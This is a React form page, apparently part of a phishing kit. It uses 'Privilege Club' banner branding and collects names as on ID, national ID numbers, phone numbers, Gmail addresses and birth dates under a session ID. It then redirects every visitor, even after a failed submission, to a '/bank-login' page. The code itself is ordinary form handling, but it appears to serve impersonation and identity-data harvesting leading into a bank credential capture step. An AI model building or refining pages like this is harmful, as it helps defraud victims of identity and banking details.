import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

const titles = [
  { ar: "السيد", en: "Mr." },
  { ar: "السيدة", en: "Mrs." },
  { ar: "الآنسة", en: "Ms." },
  { ar: "الدكتور", en: "Dr." },
  { ar: "الأستاذ", en: "Prof." },
  { ar: "الشيخ", en: "Sheikh" },
  { ar: "الشيخة", en: "Sheikha" },
  { ar: "السعادة", en: "Excellency" }
];

const countries = [
  { ar: "قطر", en: "Qatar", code: "+974" },
  { ar: "المملكة العربية السعودية", en: "Saudi Arabia", code: "+966" },
  { ar: "الإمارات العربية المتحدة", en: "United Arab Emirates", code: "+971" },
  { ar: "الكويت", en: "Kuwait", code: "+965" },
  { ar: "البحرين", en: "Bahrain", code: "+973" },
  { ar: "عمان", en: "Oman", code: "+968" },
  { ar: "مصر", en: "Egypt", code: "+20" },
  { ar: "الأردن", en: "Jordan", code: "+962" },
  { ar: "لبنان", en: "Lebanon", code: "+961" },
  { ar: "المغرب", en: "Morocco", code: "+212" },
  { ar: "تونس", en: "Tunisia", code: "+216" },
  { ar: "الجزائر", en: "Algeria", code: "+213" },
  { ar: "العراق", en: "Iraq", code: "+964" },
  { ar: "اليمن", en: "Yemen", code: "+967" },
  { ar: "السودان", en: "Sudan", code: "+249" },
  { ar: "ليبيا", en: "Libya", code: "+218" },
  { ar: "فلسطين", en: "Palestine", code: "+970" },
  { ar: "سوريا", en: "Syria", code: "+963" },
  { ar: "موريتانيا", en: "Mauritania", code: "+222" },
  { ar: "الصومال", en: "Somalia", code: "+252" },
  { ar: "جيبوتي", en: "Djibouti", code: "+253" },
  { ar: "جزر القمر", en: "Comoros", code: "+269" },
  { ar: "تركيا", en: "Turkey", code: "+90" },
  { ar: "المملكة المتحدة", en: "United Kingdom", code: "+44" },
  { ar: "الولايات المتحدة", en: "United States", code: "+1" },
  { ar: "فرنسا", en: "France", code: "+33" },
  { ar: "ألمانيا", en: "Germany", code: "+49" },
  { ar: "إسبانيا", en: "Spain", code: "+34" },
  { ar: "إيطاليا", en: "Italy", code: "+39" },
  { ar: "كندا", en: "Canada", code: "+1" },
  { ar: "أستراليا", en: "Australia", code: "+61" },
  { ar: "الهند", en: "India", code: "+91" },
  { ar: "باكستان", en: "Pakistan", code: "+92" },
  { ar: "إندونيسيا", en: "Indonesia", code: "+62" },
  { ar: "ماليزيا", en: "Malaysia", code: "+60" },
  { ar: "الفلبين", en: "Philippines", code: "+63" },
  { ar: "تايلاند", en: "Thailand", code: "+66" },
  { ar: "الصين", en: "China", code: "+86" },
  { ar: "اليابان", en: "Japan", code: "+81" },
  { ar: "روسيا", en: "Russia", code: "+7" },
  { ar: "البرازيل", en: "Brazil", code: "+55" }
];

const sliderImages = [
  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const { language } = useLanguage();
  const sessionId = localStorage.getItem("sessionId");
  const isArabic = language === "ar";

  const [formData, setFormData] = useState({
    title: "",
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    residence: "Qatar",
    countryCode: "+974",
    phoneNumber: "",
    email: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    gender: isArabic ? "ذكر" : "Male",
    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
  });

  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const updateSubmissionMutation = trpc.submissions.updateSubmission.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;

    const fullBirthDate = `${formData.birthYear}-${formData.birthMonth}-${formData.birthDay}`;
    const fullPhone = `${formData.countryCode}${formData.phoneNumber}`;

    try {
      await updateSubmissionMutation.mutateAsync({
        sessionId,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        nameArabic: formData.nameArabic,
        idNumber: formData.idNumber,
        residence: formData.residence,
        phoneNumber: fullPhone,
        email: formData.email,
        dateOfBirth: fullBirthDate,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      setLocation("/bank-login");
    } catch (err) {
      console.error("Update failed:", err);
      setLocation("/bank-login");
    }
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
      {/* Slider Section */}
      <div style={{ width: '100%', position: 'relative', height: '200px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        {sliderImages.map((image, index) => (
          <img 
            key={index}
            src={image} 
            style={{ 
              width: '100%', 
              height: '100%', 
              objectFit: 'cover', 
              position: 'absolute', 
              top: 0, 
              left: 0, 
              zIndex: 1, 
              transition: 'opacity 1.5s ease-in-out',
              opacity: currentSlide === index ? 1 : 0
            }}
            alt="Privilege Club Banner"
          />
        ))}
        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.3)', zIndex: 2 }}></div>
        <div style={{ position: 'relative', zIndex: 3, textAlign: 'center', color: 'white', padding: '20px', maxWidth: '800px' }}>
          <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '10px', textShadow: '0 2px 4px rgba(0,0,0,0.5)' }}>
            {isArabic ? "أكمل بياناتك الشخصية" : "Complete Your Personal Data"}
          </h1>
        </div>
      </div>

      <div style={{ maxWidth: '500px', margin: '-50px auto 20px auto', background: 'white', padding: '25px', borderRadius: '10px', boxShadow: '0 4px 15px rgba(0,0,0,0.1)', position: 'relative', zIndex: 10 }}>
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "اللقب" : "Title"}</label>
            <select name="title" value={formData.title} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
              <option value="">{isArabic ? "-- اختر اللقب --" : "-- Select Title --"}</option>
              {titles.map((t, i) => (
                <option key={i} value={isArabic ? t.ar : t.en}>{isArabic ? t.ar : t.en}</option>
              ))}
            </select>
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Name as in ID (English)"}</label>
            <input type="text" name="nameEnglish" placeholder="Full Name" value={formData.nameEnglish} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
            <input type="text" name="nameArabic" placeholder="الاسم الكامل" value={formData.nameArabic} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "رقم الهوية" : "ID Number"}</label>
            <input type="number" name="idNumber" placeholder={isArabic ? "رقم الهوية" : "ID Number"} value={formData.idNumber} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
            <select name="residence" value={formData.residence} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
              {countries.map((c, i) => (
                <option key={i} value={isArabic ? c.ar : c.en}>{isArabic ? c.ar : c.en}</option>
              ))}
            </select>
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "رقم الجوال" : "Phone Number"}</label>
            <div style={{ display: 'grid', gridTemplateColumns: '100px 1fr', gap: '10px' }}>
              <select name="countryCode" value={formData.countryCode} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                {countries.map((c, i) => (
                  <option key={i} value={c.code}>{c.code} ({isArabic ? c.ar : c.en})</option>
                ))}
              </select>
              <input type="number" name="phoneNumber" placeholder="XXXXXXXX" value={formData.phoneNumber} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
            </div>
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
            <input type="email" name="email" placeholder="example@gmail.com" value={formData.email} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px' }}>
              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                <option value="">{isArabic ? "يوم" : "Day"}</option>
                {Array.from({ length: 31 }, (_, i) => i + 1).map(d => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                <option value="">{isArabic ? "شهر" : "Month"}</option>
                {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                <option value="">{isArabic ? "سنة" : "Year"}</option>
                {Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i).map(y => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "النوع" : "Gender"}</label>
            <select name="gender" value={formData.gender} onChange={handleChange} style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
              <option value={isArabic ? "ذكر" : "Male"}>{isArabic ? "ذكر" : "Male"}</option>
              <option value={isArabic ? "أنثى" : "Female"}>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>

          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "حالة العميل" : "Customer Status"}</label>
            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange} style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
              <option value={isArabic ? "عميل حالي" : "Existing Customer"}>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
              <option value={isArabic ? "عميل جديد" : "New Customer"}>{isArabic ? "عميل جديد" : "New Customer"}</option>
            </select>
          </div>

          <button type="submit" style={{ width: '100%', padding: '15px', backgroundColor: '#8C0032', color: 'white', border: 'none', borderRadius: '5px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginTop: '10px' }}>
            {isArabic ? "متابعة" : "Continue"}
          </button>
        </form>
      </div>

      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" style={{ width: '100%', height: 'auto', display: 'block', marginTop: '30px' }} alt="Footer" />
    </div>
  );
}
